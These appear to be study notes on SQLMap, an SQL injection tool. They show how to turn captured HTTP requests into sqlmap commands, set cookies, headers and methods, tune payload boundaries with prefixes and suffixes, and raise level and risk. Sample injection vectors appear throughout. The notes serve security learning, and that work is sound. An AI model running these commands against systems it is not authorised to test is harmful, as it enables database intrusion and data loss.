# Running SQLMap on an HTTP Request
## Curl Commands
![cURL](image-4.png) 
**paste it to the CLI and changing the original command curl to sqlmap**

## GET/POST Requests
common scenario, GET parameters are provided with the usage of option -u/--url, as in the previous example. As for testing POST data, the --data flag can be used, as follows:

    sqlmap 'http://www.example.com/' --data 'uid=1&name=test'  #test the vuln in url
    sqlmap 'http://www.example.com/' --data 'uid=1*&name=test' #test the vuln in uid parameter.


## Full HTTP Requests

    sqlmap -r req.txt

`req.txt`
    GET /?id=1 HTTP/1.1
    Host: www.example.com
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    DNT: 1
    If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
    If-None-Match: "3147526947"
    Cache-Control: max-age=0

## Custom SQLMap Requests

    sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'     #if the request need session then
    sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

Apply some more headers like  `--host`, `--referer`, and `-A/--user-agent` and  `--random-agent`. the `--mobile` switch can be used to imitate the smartphone by using that same header value.

if we wanted to specify an alternative HTTP method, other than `GET` and `POST` (e.g., `PUT`), we can utilize the option `--method`,

    sqlmap -u www.target.com --data='id=1' --method PUT

## Custom HTTP Requests
Apart from the most common form-data `POST` body style (e.g. `id=1`), SQLMap also supports JSON formatted (e.g. `{"id":1}`) and XML formatted (e.g.` <element><id>1</id></element>`) HTTP requests.

# Handling SQLMap Errors

`--parse-errors`  - Display Errors
`sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`  store the traffic in a file

`-v`- Verbose Output 
    
    sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch

`--proxy` option to redirect the whole traffic through a (MiTM) proxy (e.g., Burp).

Attack tuning

vector (e.g., UNION ALL SELECT 1,2,VERSION()): central part of the payload, carrying the useful SQL code to be executed at the target.

boundaries (e.g. '<vector>-- -): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement

Prefix/Suffix - `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`

## Level/Risk

- The option --level (1-5, default 1) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).

- The option --risk (1-3, default 1) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).
